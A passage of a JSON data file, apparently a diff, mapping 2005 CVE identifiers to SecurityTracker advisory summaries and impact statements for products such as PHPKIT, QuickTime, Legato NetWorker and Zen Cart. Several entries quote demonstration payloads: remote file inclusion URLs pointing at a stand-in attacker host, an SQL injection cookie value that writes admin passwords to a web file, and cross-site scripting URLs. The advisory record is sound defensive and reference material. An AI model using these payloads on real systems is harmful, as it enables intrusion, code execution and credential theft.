+        "body": "Several vulnerabilities were reported in PHPKIT. A remote user can inject SQL commands, conduct cross-site scripting attacks, and execute arbitrary code on the target system.Several scripts do not properly filter HTML code from user-supplied input before displaying the input. A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the PHPKIT software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.The screen name fields in the 'login/profile.php' and 'login/userinfo.php' scripts are affected.The 'site_body' field in 'admin/admin.php' is affected if register_globals is enabled.The HTTP Referer value is affected when the administrator views browser 'referer' statistics.The title tag and the alt image attribute are not filtered within a forum posting.The subject line of 'imcenter.php' is affected.The 'Homepage' field in the guestbook is affected.A remote user can also supply a specially crafted parameter value to execute SQL commands on the underlying database. Several scripts are affected, including some of those mentioned above.A remote user can supply a specially crafted path parameter to include files on the target system. Files that are ostensibly PNG image files (but are actually PHP files) are affected.If register_globals is enabled, a remoter user can supply a specially crafted parameter value containing eval() syntax characters (i.e., curly braces) to execute arbitrary PHP code on the target system.The vendor was notified on September 30, 2005.Christopher Kunz, Stefan Esser, Stefan Walk, and Johann-Peter Hartmann discovered these vulnerabilities.The original advisory is available at:http://www.hardened-php.net/advisory_212005.80.html",
+        "extra": "A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the PHPKIT software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.A remote user can execute SQL commands on the underlying database.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3567": [
+      {
+        "url": "http://securitytracker.com/id?1015171",
+        "title": "IBM Tivoli Directory Server Unspecified SLAPD Binding Error May Let Remote Users Modify/Delete Data",
+        "body": "A vulnerability was reported in IBM Tivoli Directory Server. A remote user may be able to modify or delete directory data on the target system.An unspecified vulnerability exists in the server's slapd daemon. A user can gain unauthorized access to the directory server to modify or delete directory data.The vendor discovered this vulnerability.[Editor's note: It is not clear whether the remote user must be authenticated or not.]",
+        "extra": "A remote user may be able to modify or delete directory data.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3571": [
+      {
+        "url": "http://securitytracker.com/id?1015206",
+        "title": "PHPCalendar, PHPClique, PHPFanBase, PHPCurrently, and PHPQuotes Let Remote Users Execute Arbitrary Code",
+        "body": "Robin Verton reported a vulnerability in PHPCalendar and other scripts available via 'codegrrl.com'. A remote user can execute arbitrary code on the target system.The 'protection.php' script does not properly validate user-supplied input in the 'siteurl' parameter. If register_globals is enabled, a remote user can supply a specially crafted URL to cause the target system to include and execute arbitrary PHP code from a remote location. The PHP code, including operating system commands, will run with the privileges of the target web service.A demonstration exploit URL is provided:http://[target]/protection.php?action=logout&siteurl=http://[remote]/malicoius-code.txtThe PHPCalendar, PHPClique, PHPFanBase, PHPCurrently, and PHPQuotes scripts available via 'codegrrl.com' are affected.",
+        "extra": "A remote user can execute arbitrary PHP code and operating system commands on the target system with the privileges of the target web service.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3631": [
+      {
+        "url": "http://securitytracker.com/id?1015386",
+        "title": "udev Insecure File Permissions in '/dev/input' May Let Local Users Obtain Sensitive Information",
+        "body": "A vulnerability was reported in udev. A local user may be able to obtain potentially sensitive user data.The udev application does not properly set permissions on various files in /dev/input. A local user may be able to access the files to obtain potentially sensitive data entered by a user at the console, such as passwords.Richard Cunningham discovered this vulnerability.",
+        "extra": "A local user may be able to obtain potentially sensitive user data.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3644": [
+      {
+        "url": "http://securitytracker.com/id?1015233",
+        "title": "Microsoft Windows RPC Service May Let Remote Users Deny Service",
+        "body": "A vulnerability was reported in the RPC service on Microsoft Windows. A remote user can cause denial of service conditions on the target system.A remote user can trigger a memory allocation error in the RPC service to cause denial of service conditions. When sustained, the attack can cause excessive memory consumption on the target system.On Windows 2000 SP4, a remote user can exploit this flaw. On Windows XP SP1, a remote authenticated user can exploit this flaw. However, in certain configurations, a remote user can authenticate as the Guest account and conduct this denial of service attack.Windows XP SP2 is not affected. Windows Server 2003 and Windows Server 2003 SP1 are not affected.Demonstration exploit code has been publicly released.Winny Thomas reported this vulnerability.",
+        "extra": "A remote user can cause excessive memory consumption on the target system, resulting in denial of service conditions. In some cases, authentication is required.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3646": [
+      {
+        "url": "http://securitytracker.com/id?1015193",
+        "title": "phpAdsNew Input Validation Bugs in '/admin/lib-sessions.inc.php' Permit SQL Injection Attacks",
+        "body": "A vulnerability was reported in phpAdsNew. A remote user can inject SQL commands.The '/admin/lib-sessions.inc.php' script does not properly validate user-supplied input in the 'sessionID' cookie variable. A remote user can supply a specially crafted parameter value to execute SQL commands on the underlying database.A demonstration exploit value is provided:sessionID=adsds'/**/UNION/**/SELECT admin_pw from phpads_config into outfile \"/var/www/blah.txt\"/*;Kevin Fernandez \"Siegfried\" from the Zone-H Research Team discovered this vulnerability.The original advisory is available at:http://www.zone-h.org/en/advisories/read/id=8413/http://www.zone-h.fr/fr/advisories/read/id=674/",
+        "extra": "A remote user can execute SQL commands on the underlying database.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3653": [
+      {
+        "url": "http://securitytracker.com/id?1015526",
+        "title": "Computer Associates Content-Length Buffer Overflow in iGateway Lets Remote Users Execute Arbitrary Code",
+        "body": "iDEFENSE reported a vulnerability in Computer Associates iGateway. A remote user can execute arbitrary code on the target system.A remote user can send an HTTP request with a specially crafted, negative HTTP Content-Length value to the iGateway service on port 5250 on the target system to trigger a buffer overflow. By also supplying a specially crafted, large URI, arbitrary code can be executed on the target system. The code will run with System level privileges on Windows-based systems.Several Computer Associates products include iGateway, including:BrightStor ARCserve Backup r11.5BrightStor ARCserve Backup r11.1BrightStor ARCserve Backup for Windows r11BrightStor Enterprise Backup 10.5BrightStor ARCserve Backup v9.01BrightStor ARCserve Backup Laptop & Desktop r11.1BrightStor ARCserve Backup Laptop & Desktop r11BrightStor Process Automation Manager r11.1BrightStor SAN Manager r11.1BrightStor SAN Manager r11.5BrightStor Storage Resource Manager r11.5BrightStor Storage Resource Manager r11.1BrightStor Storage Resource Manager 6.4BrightStor Storage Resource Manager 6.3BrightStor Portal 11.1eTrust Audit 1.5 SP2 (iRecorders and ARIES)eTrust Audit 1.5 SP3 (iRecorders and ARIES)eTrust Audit 8.0 (iRecorders and ARIES)eTrust Admin 8.1eTrust Identity Minder 8.0eTrust Secure Content Manager (SCM) R8eTrust Integrated Threat Management (ITM) R8eTrust Directory, R8.1 (Web Components Only)Unicenter CA Web Services Distributed Management R11Unicenter AutoSys JM R11Unicenter Management for WebLogic / Management for WebSphere R11Unicenter Service Delivery R11Unicenter Service Level Management (USLM) R11Unicenter Application Performance Monitor R11Unicenter Service Desk R11Unicenter Service Desk Knowledge Tools R11Unicenter Asset Portfolio Management R11Unicenter Service Metric Analysis R11Unicenter Service Catalog/Assure/Accounting R11Unicenter MQ Management R11Unicenter Application Server Management R11Unicenter Web Server Management R11Unicenter Exchange Management R11The vendor was notified on November 15, 2005.The original advisory is available at:http://www.idefense.com/intelligence/vulnerabilities/display.php?id=376",
+        "extra": "A remote user can execute arbitrary code on the target system. On Windows-based systems, the code will run with System level privileges. On Linux- and UNIX-based systems, a remote user can cause denial of service conditions.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3658": [
+      {
+        "url": "http://securitytracker.com/id?1015500",
+        "title": "EMC Legato NetWorker 'nsrd.exe' and 'nsrexecd.exe' Heap Overflows Let Remote Users Execute Arbitrary Code",
+        "body": "iDEFENSE reported several vulnerabilities in Legato NetWorker. A remote user can execute arbitrary code on the target system.A remote user can send specially crafted RPC requests to RPC program number 390109 on the target system to trigger a heap overflow or a NULL pointer dereference in 'nsrd.exe'.Backup client systems and server systems are affected.A remote user can also send specially crafted RPC requests to RPC program number 390113 on the target system to trigger a heap overflow in 'nsrexecd.exe'.The vendor was notified on November 17, 2005.The original advisories are available at:http://www.idefense.com/intelligence/vulnerabilities/display.php?id=373http://www.idefense.com/intelligence/vulnerabilities/display.php?id=374http://www.idefense.com/intelligence/vulnerabilities/display.php?id=375",
+        "extra": "A remote user can cause the nsrd service to crash.A remote user can execute arbitrary code on the target system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      },
+      {
+        "url": "http://securitytracker.com/id?1015545",
+        "title": "Sun StorEdge 'nsrd.exe' and 'nsrexecd.exe' Heap Overflows Let Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in Sun StorEdge Enterprise Backup Software. A remote user can execute arbitrary code on the target system.A remote user can send specially crafted RPC requests to RPC program number 390109 on the target system to trigger a heap overflow or a NULL pointer dereference in 'nsrd.exe'.Backup client systems and server systems are affected.A remote user can also send specially crafted RPC requests to RPC program number 390113 on the target system to trigger a heap overflow in 'nsrexecd.exe'.This vulnerability was originally reported by iDEFENSE as affecting EMC Legato NetWorker [see Alert ID 1015500]. Sun StorEdge Enterprise Backup Software is also affected.The original advisories are available at:http://www.idefense.com/intelligence/vulnerabilities/display.php?id=373http://www.idefense.com/intelligence/vulnerabilities/display.php?id=374http://www.idefense.com/intelligence/vulnerabilities/display.php?id=375",
+        "extra": "A remote user can cause the nsrd service to crash.A remote user can execute arbitrary code on the target system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3659": [
+      {
+        "url": "http://securitytracker.com/id?1015500",
+        "title": "EMC Legato NetWorker 'nsrd.exe' and 'nsrexecd.exe' Heap Overflows Let Remote Users Execute Arbitrary Code",
+        "body": "iDEFENSE reported several vulnerabilities in Legato NetWorker. A remote user can execute arbitrary code on the target system.A remote user can send specially crafted RPC requests to RPC program number 390109 on the target system to trigger a heap overflow or a NULL pointer dereference in 'nsrd.exe'.Backup client systems and server systems are affected.A remote user can also send specially crafted RPC requests to RPC program number 390113 on the target system to trigger a heap overflow in 'nsrexecd.exe'.The vendor was notified on November 17, 2005.The original advisories are available at:http://www.idefense.com/intelligence/vulnerabilities/display.php?id=373http://www.idefense.com/intelligence/vulnerabilities/display.php?id=374http://www.idefense.com/intelligence/vulnerabilities/display.php?id=375",
+        "extra": "A remote user can cause the nsrd service to crash.A remote user can execute arbitrary code on the target system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      },
+      {
+        "url": "http://securitytracker.com/id?1015545",
+        "title": "Sun StorEdge 'nsrd.exe' and 'nsrexecd.exe' Heap Overflows Let Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in Sun StorEdge Enterprise Backup Software. A remote user can execute arbitrary code on the target system.A remote user can send specially crafted RPC requests to RPC program number 390109 on the target system to trigger a heap overflow or a NULL pointer dereference in 'nsrd.exe'.Backup client systems and server systems are affected.A remote user can also send specially crafted RPC requests to RPC program number 390113 on the target system to trigger a heap overflow in 'nsrexecd.exe'.This vulnerability was originally reported by iDEFENSE as affecting EMC Legato NetWorker [see Alert ID 1015500]. Sun StorEdge Enterprise Backup Software is also affected.The original advisories are available at:http://www.idefense.com/intelligence/vulnerabilities/display.php?id=373http://www.idefense.com/intelligence/vulnerabilities/display.php?id=374http://www.idefense.com/intelligence/vulnerabilities/display.php?id=375",
+        "extra": "A remote user can cause the nsrd service to crash.A remote user can execute arbitrary code on the target system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3709": [
+      {
+        "url": "http://securitytracker.com/id?1015464",
+        "title": "Apple QuickTime TGA Overflows May Let Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in QuickTime. A remote user may be able to cause arbitrary code to be executed on the target user's system.A remote user can create a specially crafted TGA image that, when viewed by the target user, will trigger a buffer overflow, integer overflow, or integer underflow and execute arbitrary code on the target user's system.The code will run with the privileges of the target user.Apple credits Dejun Meng of Fortinet with reporting this vulnerability.",
+        "extra": "A remote user can create an image that, when viewed by the target user, will execute arbitrary code on the target user's system with the privileges of the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3710": [
+      {
+        "url": "http://securitytracker.com/id?1015465",
+        "title": "Apple QuickTime TIFF Integer Overflow May Let Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in QuickTime. A remote user may be able to cause arbitrary code to be executed on the target user's system.A remote user can create a specially crafted TIFF image that, when viewed by the target user, will trigger an integer overflow and execute arbitrary code on the target user's system.The code will run with the privileges of the target user.Apple credits Dejun Meng of Fortinet with reporting this vulnerability.",
+        "extra": "A remote user can create an image that, when viewed by the target user, will execute arbitrary code on the target user's system with the privileges of the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3711": [
+      {
+        "url": "http://securitytracker.com/id?1015465",
+        "title": "Apple QuickTime TIFF Integer Overflow May Let Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in QuickTime. A remote user may be able to cause arbitrary code to be executed on the target user's system.A remote user can create a specially crafted TIFF image that, when viewed by the target user, will trigger an integer overflow and execute arbitrary code on the target user's system.The code will run with the privileges of the target user.Apple credits Dejun Meng of Fortinet with reporting this vulnerability.",
+        "extra": "A remote user can create an image that, when viewed by the target user, will execute arbitrary code on the target user's system with the privileges of the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3713": [
+      {
+        "url": "http://securitytracker.com/id?1015466",
+        "title": "Apple QuickTime GIF Buffer Overflow May Let Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in QuickTime. A remote user may be able to cause arbitrary code to be executed on the target user's system.A remote user can create a specially crafted GIF image that, when viewed by the target user, will trigger a heap overflow and execute arbitrary code on the target user's system.The code will run with the privileges of the target user.Apple credits Karl Lynn of eEye Digital Security with reporting this vulnerability.",
+        "extra": "A remote user can create an image that, when viewed by the target user, will execute arbitrary code on the target user's system with the privileges of the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3714": [
+      {
+        "url": "http://securitytracker.com/id?1015443",
+        "title": "Apple AirPort Base Station Lets Remote Users Deny Service on the Network Interface",
+        "body": "A vulnerability was reported in Apple AirPort. A remote user can cause the base station to stop responding.A remote user can send specially crafted packets to the target AirPort base station device to cause the target station's network interface to stop responding normally.Apple credits Michael Zanetta of NETwork Security Consortium with reporting this vulnerability.",
+        "extra": "A remote user can cause the base station network interface to stop responding.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3732": [
+      {
+        "url": "http://securitytracker.com/id?1015254",
+        "title": "IPSec-tools IKE Processing Lets Remote Users Deny Service",
+        "body": "A vulnerability was reported in IPsec-Tools. A remote user can cause denial of service conditions.The Internet Key Exchange version 1 (IKEv1) implementation does not properly process IKE packets when in aggressive mode. A remote user can send specially crafted IKE packets to trigger a null pointer dereference and cause the IKE service to crash.The flaw resides in 'isakmp_agg.c'.A test suite developed by the University of Oulu Secure Programming Group (OUSPG) was used to discover these vulnerabilities.",
+        "extra": "A remote user can cause denial of service conditions on the target system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3760": [
+      {
+        "url": "http://securitytracker.com/id?1015255",
+        "title": "IBM WebSphere on z/OS Double-Free Bug Lets Remote Users Crash the Service",
+        "body": "A vulnerability was reported in IBM WebSphere on z/OS. A remote user may be able to cause denial of service conditions.A remote user can trigger a double-free, causing heap corruption and resulting in an ABEND (crash).No further details were provided",
+        "extra": "A remote user can cause denial of service conditions.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3831": [
+      {
+        "url": "http://securitytracker.com/id?1015265",
+        "title": "ZipStar Buffer Overflow in Processing ZIP Files May Let Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in ZipStar. A remote user can cause arbitrary code to be executed on a target user's system.A remote user can create a specially crafted ZIP file that, when processed by the target user, will trigger a buffer overflow and execute arbitrary code. The code will run with the privileges of the target user.A specially crafted full pathname of a file in a ZIP archive can trigger a stack overflow in CxZIP60.dll and CxZIP60u.dll.The vendor was notified on November 3, 2005.Tan Chew Keong of Secunia Research discovered these vulnerabilities.",
+        "extra": "A remote user can create a file that, when processed by the target user, will execute arbitrary code on the target user's system with the privileges of the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      },
+      {
+        "url": "http://securitytracker.com/id?1015266",
+        "title": "Squeez Buffer Overflows in Processing ZIP/UUE Files May Let Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in Squeez. A remote user can cause arbitrary code to be executed on a target user's system.A remote user can create a specially crafted ZIP or UUE file that, when processed by the target user, will trigger a buffer overflow and execute arbitrary code. The code will run with the privileges of the target user.A specially crafted full pathname of a file in a ZIP archive can trigger a stack overflow in CxZIP60.dll and CxZIP60u.dll.A specially crafted full pathname of a file that is UUE encoded can trigger a stack overflow in CxUux60.dll and CxUux60u.dll.The vendor was notified on November 3, 2005.Tan Chew Keong of Secunia Research discovered these vulnerabilities.",
+        "extra": "A remote user can create a file that, when processed by the target user, will execute arbitrary code on the target user's system with the privileges of the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      },
+      {
+        "url": "http://securitytracker.com/id?1015267",
+        "title": "SpeedCommander Buffer Overflows in Processing ZIP/UUE Files May Let Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in SpeedCommander. A remote user can cause arbitrary code to be executed on a target user's system.A remote user can create a specially crafted ZIP or UUE file that, when processed by the target user, will trigger a buffer overflow and execute arbitrary code. The code will run with the privileges of the target user.A specially crafted full pathname of a file in a ZIP archive can trigger a stack overflow in CxZIP60.dll and CxZIP60u.dll.A specially crafted full pathname of a file that is UUE encoded can trigger a stack overflow in CxUux60.dll and CxUux60u.dll.The vendor was notified on November 3, 2005.Tan Chew Keong of Secunia Research discovered these vulnerabilities.",
+        "extra": "A remote user can create a file that, when processed by the target user, will execute arbitrary code on the target user's system with the privileges of the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3832": [
+      {
+        "url": "http://securitytracker.com/id?1015265",
+        "title": "ZipStar Buffer Overflow in Processing ZIP Files May Let Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in ZipStar. A remote user can cause arbitrary code to be executed on a target user's system.A remote user can create a specially crafted ZIP file that, when processed by the target user, will trigger a buffer overflow and execute arbitrary code. The code will run with the privileges of the target user.A specially crafted full pathname of a file in a ZIP archive can trigger a stack overflow in CxZIP60.dll and CxZIP60u.dll.The vendor was notified on November 3, 2005.Tan Chew Keong of Secunia Research discovered these vulnerabilities.",
+        "extra": "A remote user can create a file that, when processed by the target user, will execute arbitrary code on the target user's system with the privileges of the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      },
+      {
+        "url": "http://securitytracker.com/id?1015266",
+        "title": "Squeez Buffer Overflows in Processing ZIP/UUE Files May Let Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in Squeez. A remote user can cause arbitrary code to be executed on a target user's system.A remote user can create a specially crafted ZIP or UUE file that, when processed by the target user, will trigger a buffer overflow and execute arbitrary code. The code will run with the privileges of the target user.A specially crafted full pathname of a file in a ZIP archive can trigger a stack overflow in CxZIP60.dll and CxZIP60u.dll.A specially crafted full pathname of a file that is UUE encoded can trigger a stack overflow in CxUux60.dll and CxUux60u.dll.The vendor was notified on November 3, 2005.Tan Chew Keong of Secunia Research discovered these vulnerabilities.",
+        "extra": "A remote user can create a file that, when processed by the target user, will execute arbitrary code on the target user's system with the privileges of the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      },
+      {
+        "url": "http://securitytracker.com/id?1015267",
+        "title": "SpeedCommander Buffer Overflows in Processing ZIP/UUE Files May Let Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in SpeedCommander. A remote user can cause arbitrary code to be executed on a target user's system.A remote user can create a specially crafted ZIP or UUE file that, when processed by the target user, will trigger a buffer overflow and execute arbitrary code. The code will run with the privileges of the target user.A specially crafted full pathname of a file in a ZIP archive can trigger a stack overflow in CxZIP60.dll and CxZIP60u.dll.A specially crafted full pathname of a file that is UUE encoded can trigger a stack overflow in CxUux60.dll and CxUux60u.dll.The vendor was notified on November 3, 2005.Tan Chew Keong of Secunia Research discovered these vulnerabilities.",
+        "extra": "A remote user can create a file that, when processed by the target user, will execute arbitrary code on the target user's system with the privileges of the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3859": [
+      {
+        "url": "http://securitytracker.com/id?1015277",
+        "title": "Q-News Include File Bug Lets Remote Users Execute Arbitrary Code",
+        "body": "][GB][ reported a vulnerability in Q-News. A remote user can execute arbitrary code on the target system.The 'q-news.php' script does not properly validate user-supplied input in the 'id' parameter. A remote user can supply a specially crafted URL to cause the target system to include and execute arbitrary PHP code from a remote location. The PHP code, including operating system commands, will run with the privileges of the target web service. A demonstration exploit URL is provided:http://[target]/path_to_qnews/q-news.php?id=http://[attacker_url]",
+        "extra": "A remote user can execute arbitrary PHP code and operating system commands on the target system with the privileges of the target web service.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3860": [
+      {
+        "url": "http://securitytracker.com/id?1015278",
+        "title": "Athena Include File Bug Lets Remote Users Execute Arbitrary Code",
+        "body": "beford and ][GB][ reported a vulnerability in Athena. A remote user can execute arbitrary code on the target system.The 'athena.php' does not properly validate user-supplied input in several parameters. A remote user can supply a specially crafted URL to cause the target system to include and execute arbitrary PHP code from a remote location. The PHP code, including operating system commands, will run with the privileges of the target web service.A demonstration exploit URL is provided:http://[target]/path_to_athena/athena.php?athena_dir=http://[attacker_url]",
+        "extra": "A remote user can execute arbitrary PHP code and operating system commands on the target system with the privileges of the target web service.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3861": [
+      {
+        "url": "http://securitytracker.com/id?1015276",
+        "title": "phpGreetz Include File Bug Lets Remote Users Execute Arbitrary Code",
+        "body": "beford and ][GB][ reported a vulnerability in phpGreetz. A remote user can execute arbitrary code on the target system.The 'content.php' script does not properly validate user-supplied input in the 'content' parameter. A remote user can supply a specially crafted URL to cause the target system to include and execute arbitrary PHP code from a remote location. The PHP code, including operating system commands, will run with the privileges of the target web service.A demonstration exploit URL is provided:http://[target]/path_to_phpgreetz/content.php?content=http://[attacker_url]",
+        "extra": "A remote user can execute arbitrary PHP code and operating system commands on the target system with the privileges of the target web service.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3955": [
+      {
+        "url": "http://securitytracker.com/id?1015264",
+        "title": "blogBuddies Input Validation Holes Let Remote Users Conduct Cross-Site Scripting Attacks",
+        "body": "][GB][ reported a vulnerability in blogBuddies. A remote user can conduct cross-site scripting attacks. A remote user can also determine the installation path.The 'index.php', 'magpie_debug.php', and 'magpie_slashbox.php' scripts do not properly filter HTML code from user-supplied input in various parameters before displaying the input. A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the blogBuddies software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.Some demonstration exploit URLs are provided:http://[target]/blogbuddies/index.php?u=\"><script>alert(\"hola vengo a flotar\");</script>http://[target]/blogbuddies/magpierss-0.71/scripts/magpie_debug.php?url=\"><script>alert(\"...\");</script>http://[target]/blogbuddies/magpierss-0.71/scripts/magpie_slashbox.php?rss_url=\"><script>alert(\"...\");</script>A remote user can also directly invoke certain scripts to cause the system to disclose the installation path.Some demonstration exploit URLs are provided:http://[target]/blogbuddies/magpierss-0.71/scripts/magpie_debug.phphttp://[target]/blogbuddies/magpierss-0.71/scripts/simple_smarty.php",
+        "extra": "A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the blogBuddies software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-3996": [
+      {
+        "url": "http://securitytracker.com/id?1015306",
+        "title": "Zen Cart Input Validation Hole in 'password_forgotten.php' Lets Remote Users Inject SQL Commands",
+        "body": "rgod reported a vulnerability in Zen Cart. A remote user can inject SQL commands.The 'admin/password_forgotten.php' script does not properly validate user-supplied input in the 'admin_email' parameter. A remote user can supply a specially crafted parameter value to execute SQL commands on the underlying database.This can be exploited to write arbitrary PHP code to a file on the target system. The remote user can later execute the file with the privileges of the target web service.This can be exploited regardless of the magic_quotes_gpc setting.The original advisory is available at:http://rgod.altervista.org/zencart_126d_xpl.html",
+        "extra": "A remote user can execute SQL commands on the underlying database.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-4011": [
+      {
+        "url": "http://securitytracker.com/id?1016364",
+        "title": "PHP Event Calendar (ltwCalendar) Missing Input Validation in 'id' Parameter Permits SQL Injection Attacks",
+        "body": "A vulnerability was reported in PHP Event Calendar. A remote user can inject SQL commands.The 'calendar.php' script does not properly validate user-supplied input in the 'id' parameter. A remote user can supply a specially crafted parameter value to execute SQL commands on the underlying database.A demonstration exploit URL is of the following form:/calendar.php?display=event&id=[SQL]Silitix reported this vulnerability.This product is also called 'ltwCalendar'.[Editor's note: This vulnerability was original reported by r0t in November 2005 as affecting ltwCalendar version 4.1.3 (See CVE-2005-4011).]",
+        "extra": "A remote user can execute SQL commands on the underlying database.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-4066": [
+      {
+        "url": "http://securitytracker.com/id?1015311",
+        "title": "Total Commander Weak Encryption Algorithm Lets Local Users Obtain FTP Passwords",
+        "body": "Juha-Matti Laurio reported a vulnerability in Total Commander. A local user can obtain password information.The Total Commander file manager/FTP client utility uses a weak encryption algorithm to store internal FTP account information in the 'WCX_FTP.INI' file. A local user can obtain FTP username and password information.The W32.Gudeb worm reportedly exploits this vulnerability to gather FTP usernames and passwords.The vendor was notified on December 3, 2005.The advisory is available at:http://www.networksecurity.fi/advisories/total-commander.html",
+        "extra": "A local user can obtain FTP usernames and passwords.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-4069": [
+      {
+        "url": "http://securitytracker.com/id?1015327",
+        "title": "Sony Music CD (SunnComm Media Max) Unsafe Permissions Let Local Users Gain Elevated Privileges",
+        "body": "A vulnerability was reported in the SunnComm Media Max copy protection software used in certain Sony music CDs. A local user can obtain elevated privileges.The copy protection software installs itself with unsafe permissions. The software creates the 'SunnComm Shared' directory and assigns 'Full Control' rights to the 'Everyone' group for that directory. As a result, a local user or a remote authenticated user can modify or replace executable files in that directory. For example, the user replace the 'MMX.EXE' file with arbitrary code. Then, when the target user plays an affected Sony music CD, the arbitrary code will be executed with the privileges of the target user.Jesse Burns and Alex Stamos of Information Security Partners discovered and reported this vulnerability.The original advisory is available at:http://www.eff.org/IP/DRM/Sony-BMG/MediaMaxVulnerabilityReport.pdf",
+        "extra": "A local user can gain elevated privileges on the target system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-4089": [
+      {
+        "url": "http://securitytracker.com/id?1016291",
+        "title": "Microsoft Internet Explorer Multiple Memory and Access Control Errors Let Remote Users Execute Arbitrary Code",
+        "body": "Several vulnerabilities were reported in Microsoft Internet Explorer. A remote user can cause arbitrary code to be executed on the target user's system.A remote user can create a specially crafted web page that, when loaded by the target user, will trigger a buffer overflow, memory exception, access control, or other flaw and execute arbitrary code on the target system. The code will run with the privileges of the target user.A remote user can cause an object to register an exception handler that may not properly handle certain conditions. As a result, a memory corruption error may occur and arbitrary code may be executed.A remote user can send specially UTF-8 encoded HTML to cause arbitrary code to be executed.A remote user can pass specially crafted data to the DXImageTransform.Microsoft.Light ActiveX control to execute arbitrary code.A remote user can cause Internet Explorer to instantiate a COM objects that shoud not be instantiated in Internet Explorer.A remote user can create a specially crafted cascading style sheet (CSS) that, when loaded by the target user, will cause potentially sensitive information on the target user's system to be disclosed.A remote user can cause spoofed content to be displayed in a browser window. The address bar and other parts of the trust user interface can be displayed in the context of a trusted site while the spoofed content remains under the control of the remote user.A remote user can create a specially crafted web page that, when loaded by the target user, will cause multipart HTML (.mht) files to be saved, appliwng remote code to be executed.Microsoft credits the following with reporting these vulnerabilties:Andreas Sandblad of Secunia, TippingPoint, Will Dormann of CERT/CC, H D Moore of the Metasploit Project, Yorick Koster of ITsec Security Services, hoshikuzu star_dust, and John Jones of DISC, State of Kansas.",
+        "extra": "A remote user can create a file that, when loaded by the target user, will execute arbitrary code on the target user's system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2005-4092": [
+      {
+        "url": "http://securitytracker.com/id?1015356",
+        "title": "Apple QuickTime Unspecified Heap Overflow May Let Remote Users Execute Arbitrary Code",
+        "body": "A vulnerability was reported in Apple QuickTime. A remote user may be able to execute arbitrary code on the target system.A user can trigger a heap overflow in the player and potentially execute arbitrary code on the target system. No details were provided pending vendor resolution.iTunes 6.0.1 is also affected.The vendor has been notified.badpack3t of Security-Protocols.com reported this vulnerability.The original advisory is available at:http://www.security-protocols.com/modules.php?name=News&file=article&sid=3109",
+        "extra": "A remote user may be able to cause arbitrary code to be executed on the target user's system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      },
+      {
+        "url": "http://securitytracker.com/id?1015396",
+        "title": "Apple iTunes Buffer Overflow in Playing '.mov' Files Lets Remote Users Execute Arbitrary Code",
